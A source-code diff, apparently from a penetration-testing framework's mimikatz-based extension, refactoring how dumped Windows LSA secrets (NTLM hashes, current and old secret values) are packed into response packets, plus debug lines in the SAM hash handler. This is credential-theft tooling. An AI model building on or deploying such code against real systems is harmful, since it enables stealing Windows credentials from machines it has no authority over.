@@ -552,10 +552,8 @@ VOID sys_key_handler(LPVOID lpContext, LPBYTE pKey, DWORD dwKeyLen)
  */
 VOID lsa_secret_handler(LPVOID lpContext, wchar_t* lpwSecretName, wchar_t* lpwServiceInfo, LPBYTE pMd4Digest, LPVOID pCurrent, DWORD dwCurrentSize, LPVOID pOld, DWORD dwOldSize)
 {
-	Tlv entries[5];
-	DWORD dwCount = 0;
+	Packet* group = packet_create_group();
 	Packet *response = (Packet*)lpContext;
-	LPSTR lpSecretName = NULL, lpServiceInfo = NULL, lpCurrent = NULL, lpOld = NULL;
 
 	dprintf("[KIWI LSA] Handling secret: %S", lpwSecretName);
 
@@ -566,19 +564,16 @@ VOID lsa_secret_handler(LPVOID lpContext, wchar_t* lpwSecretName, wchar_t* lpwSe
 		return;
 	}
 
-	lpSecretName = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SECRET_NAME, lpwSecretName, 0);
+	packet_add_tlv_wstring(group, TLV_TYPE_KIWI_LSA_SECRET_NAME, lpwSecretName);
 
 	if (lpwServiceInfo)
 	{
-		lpServiceInfo = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SECRET_SERV, lpwServiceInfo, 0);
+		packet_add_tlv_wstring(group, TLV_TYPE_KIWI_LSA_SECRET_SERV, lpwServiceInfo);
 	}
 
 	if (pMd4Digest)
 	{
-		entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_NTLM;
-		entries[dwCount].header.length = MD4_DIGEST_LENGTH;
-		entries[dwCount].buffer = (PUCHAR)pMd4Digest;
-		++dwCount;
+		packet_add_tlv_raw(group, TLV_TYPE_KIWI_LSA_SECRET_NTLM, pMd4Digest, MD4_DIGEST_LENGTH);
 	}
 
 	if (pCurrent)
@@ -586,51 +581,32 @@ VOID lsa_secret_handler(LPVOID lpContext, wchar_t* lpwSecretName, wchar_t* lpwSe
 		if (is_unicode_string(dwCurrentSize, pCurrent))
 		{
 			dprintf("[KIWI LSA] current text");
-			lpCurrent = packet_add_tlv_wstring_entry(&entries[dwCount], TLV_TYPE_KIWI_LSA_SECRET_CURR, (LPCWSTR)pCurrent, dwCurrentSize / sizeof(wchar_t));
+			packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_LSA_SECRET_CURR, (LPCWSTR)pCurrent, dwCurrentSize / sizeof(wchar_t));
 		}
 		else
 		{
-			dprintf("[KIWI LSA] current raw");
-			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW;
-			entries[dwCount].header.length = dwCurrentSize;
-			entries[dwCount].buffer = (PUCHAR)pCurrent;
+			dprintf("[KIWI LSA] current raw, size %u", dwCurrentSize);
+			packet_add_tlv_raw(group, TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW, pCurrent, dwCurrentSize);
 		}
-		++dwCount;
 	}
 
 	if (pOld)
 	{
 		if (is_unicode_string(dwOldSize, pOld))
 		{
-			lpOld = packet_add_tlv_wstring_entry(&entries[dwCount], TLV_TYPE_KIWI_LSA_SECRET_OLD, (LPCWSTR)pOld,  dwCurrentSize / sizeof(wchar_t));
+			dprintf("[KIWI LSA] old text");
+			packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_LSA_SECRET_OLD, (LPCWSTR)pOld, dwOldSize / sizeof(wchar_t));
 		}
 		else
 		{
-			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW;
-			entries[dwCount].header.length = dwOldSize;
-			entries[dwCount].buffer = (PUCHAR)pOld;
+			dprintf("[KIWI LSA] old raw, size %u", dwOldSize);
+			packet_add_tlv_raw(group, TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW, pOld, dwOldSize);
 		}
-		++dwCount;
 	}
 
-	packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_SECRET, entries, dwCount);
-
-	if (lpSecretName != NULL)
-	{
-		free(lpSecretName);
-	}
-	if (lpServiceInfo != NULL)
-	{
-		free(lpServiceInfo);
-	}
-	if (lpCurrent != NULL)
-	{
-		free(lpCurrent);
-	}
-	if (lpOld != NULL)
-	{
-		free(lpOld);
-	}
+	dprintf("[KIWI LSA] Adding lsa secret");
+	packet_add_group(response, TLV_TYPE_KIWI_LSA_SECRET, group);
+	dprintf("[KIWI LSA] Added lsa secret");
 }
 
 /*!
@@ -649,6 +625,8 @@ VOID sam_hash_handler(LPVOID lpContext, DWORD dwRid, wchar_t* lpwUser, DWORD dwU
 	DWORD dwCount = 0;
 	Packet *response = (Packet*)lpContext;
 	LPSTR lpSamUser = NULL;
+
+	dprintf("[KIWI SAM] Made it here");
 
 	// only add the result if we have one of the hashes and a user name.
 	if ((hasLmHash || hasNtlmHash) && lpwUser)
